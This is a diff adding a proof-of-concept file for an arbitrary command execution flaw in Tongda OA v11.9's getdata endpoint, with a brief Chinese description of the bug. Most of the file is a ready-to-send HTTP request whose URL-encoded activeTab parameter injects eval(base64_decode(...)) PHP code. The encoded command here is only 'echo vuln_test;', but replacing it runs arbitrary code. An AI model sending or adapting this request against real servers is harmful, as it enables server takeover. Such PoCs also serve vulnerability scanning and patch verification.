@@ -1,0 +1,9 @@
+# 通达OA v11.9 getdata 任意命令执行漏洞
+# 通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限
+GET /general/appbuilder/web/portal/gateway/getdata?acid=80002101&activeTab=%25E5%2527%2519%2C1%253D%253Eeval%28base64_decode%28%2522ZWNobyB2dWxuX3Rlc3Q7%2522%29%29%29%253B%2F%2A&id=19&module=Carouselimage&bid=hd_tag_m8mv2561 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2561
+RM-PRO-Token: e71e900dc7d75a07953df88d3ea53137
+RM-PRO-Time: 1742808443321
+User-Agent: curl/7.83.1
+
